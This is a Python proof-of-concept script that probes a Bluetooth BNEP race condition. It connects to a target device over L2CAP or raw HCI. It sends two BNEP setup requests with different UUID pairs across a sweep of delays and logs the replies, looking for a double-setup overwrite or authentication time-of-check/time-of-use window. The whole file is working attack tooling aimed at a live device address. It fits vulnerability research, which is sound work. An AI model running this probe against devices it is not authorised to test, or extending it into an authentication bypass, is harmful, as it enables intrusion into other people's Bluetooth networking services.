#!/usr/bin/env python3
"""Probe the valid-packet double-setup overwrite / auth TOCTOU window."""

import argparse
import time

from bnep_harness import (
    DEFAULT_SCID,
    DEFAULT_TARGET,
    choose_transport,
    close_acl,
    close_l2cap_socket,
    collect_events,
    collect_l2cap_payloads,
    connect_acl,
    make_setup_request,
    open_bnep_channel,
    open_l2cap_socket,
    open_user_socket,
    parse_uuid_pair,
    parse_setup_response,
    send_data,
)


def parse_delays(text):
    return [int(part) for part in text.split(",") if part]


def extract_setup_responses(events, t0):
    out = []
    for event in events:
        if event["kind"] != "data":
            continue
        parsed = parse_setup_response(event["payload"])
        if not parsed:
            continue
        code, label = parsed
        out.append(
            {
                "offset_ms": int((event["ts"] - t0) * 1000),
                "code": code,
                "label": label,
                "raw": event["payload"].hex(),
            }
        )
    return out


def run_case_raw_hci(target, delay_ms, pair_a, pair_b, response_window_s):
    bt = open_user_socket()
    handle = None
    try:
        handle = connect_acl(bt, target)
        dcid = open_bnep_channel(bt, handle, DEFAULT_SCID)
        print("[+] Opened BNEP channel to %s on CID 0x%04x" % (target, dcid))

        setup_a = make_setup_request(pair_a[0], pair_a[1])
        setup_b = make_setup_request(pair_b[0], pair_b[1])

        send_data(bt, handle, dcid, setup_a)
        t0 = time.monotonic()
        print("[->] setup A %04x:%04x at t=0ms" % pair_a)

        early_events = []
        if delay_ms > 0:
            early_events.extend(collect_events(bt, DEFAULT_SCID, delay_ms / 1000.0))
        early_responses = extract_setup_responses(early_events, t0)

        sent_b = False
        if early_responses:
            print("[*] Setup response arrived before setup B window")
        else:
            send_data(bt, handle, dcid, setup_b)
            sent_b = True
            print("[->] setup B %04x:%04x at t=%dms" % (pair_b[0], pair_b[1], delay_ms))

        late_events = collect_events(bt, DEFAULT_SCID, response_window_s)
        responses = early_responses + extract_setup_responses(late_events, t0)

        print("[*] Responses (%d total):" % len(responses))
        for idx, response in enumerate(responses, 1):
            print(
                "    %d. +%dms code=%d %s raw=%s"
                % (idx, response["offset_ms"], response["code"], response["label"], response["raw"])
            )
        if not responses:
            print("    (none)")

        return sent_b, responses
    finally:
        if handle is not None:
            close_acl(bt, handle)
        else:
            try:
                bt.close()
            except Exception:
                pass


def run_case_l2cap(target, delay_ms, pair_a, pair_b, response_window_s):
    sock = open_l2cap_socket(target)
    try:
        setup_a = make_setup_request(pair_a[0], pair_a[1])
        setup_b = make_setup_request(pair_b[0], pair_b[1])

        sock.sendall(setup_a)
        t0 = time.monotonic()
        print("[->] setup A %04x:%04x at t=0ms" % pair_a)

        early_events = []
        if delay_ms > 0:
            early_events.extend(collect_l2cap_payloads(sock, delay_ms / 1000.0))
        early_responses = extract_setup_responses(early_events, t0)

        sent_b = False
        if early_responses:
            print("[*] Setup response arrived before setup B window")
        else:
            sock.sendall(setup_b)
            sent_b = True
            print("[->] setup B %04x:%04x at t=%dms" % (pair_b[0], pair_b[1], delay_ms))

        late_events = collect_l2cap_payloads(sock, response_window_s)
        responses = early_responses + extract_setup_responses(late_events, t0)

        print("[*] Responses (%d total):" % len(responses))
        for idx, response in enumerate(responses, 1):
            print(
                "    %d. +%dms code=%d %s raw=%s"
                % (idx, response["offset_ms"], response["code"], response["label"], response["raw"])
            )
        if not responses:
            print("    (none)")
        return sent_b, responses
    finally:
        close_l2cap_socket(sock)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("target", nargs="?", default=DEFAULT_TARGET)
    parser.add_argument(
        "--transport",
        choices=["auto", "l2cap", "raw-hci"],
        default="auto",
        help="Bluetooth transport to use (default: auto)",
    )
    parser.add_argument(
        "--delays-ms",
        default="0,5,20,100",
        help="Comma-separated setup-B delays in milliseconds (default: 0,5,20,100)",
    )
    parser.add_argument("--uuid-a", default="1115:1116", type=parse_uuid_pair, help="First UUID pair (hex src:dst)")
    parser.add_argument("--uuid-b", default="1234:5678", type=parse_uuid_pair, help="Second UUID pair (hex src:dst)")
    parser.add_argument("--response-window", type=float, default=2.0, help="Seconds to collect replies after sends")
    args = parser.parse_args()

    delays = parse_delays(args.delays_ms)
    transport = choose_transport(args.transport)
    print("[*] Target: %s" % args.target)
    print("[*] Transport: %s" % transport)
    print("[*] UUID pair A: %04x:%04x" % args.uuid_a)
    print("[*] UUID pair B: %04x:%04x" % args.uuid_b)
    print("[*] Delay sweep (ms): %s" % ",".join(str(delay) for delay in delays))

    for delay_ms in delays:
        print("\n=== delay=%dms ===" % delay_ms)
        if transport == "raw-hci":
            sent_b, responses = run_case_raw_hci(
                args.target, delay_ms, args.uuid_a, args.uuid_b, args.response_window
            )
        else:
            sent_b, responses = run_case_l2cap(args.target, delay_ms, args.uuid_a, args.uuid_b, args.response_window)
        if not sent_b:
            print("[*] Window closed before setup B could be sent")
        elif not responses:
            print("[*] No setup response observed after setup A/B")


if __name__ == "__main__":
    main()
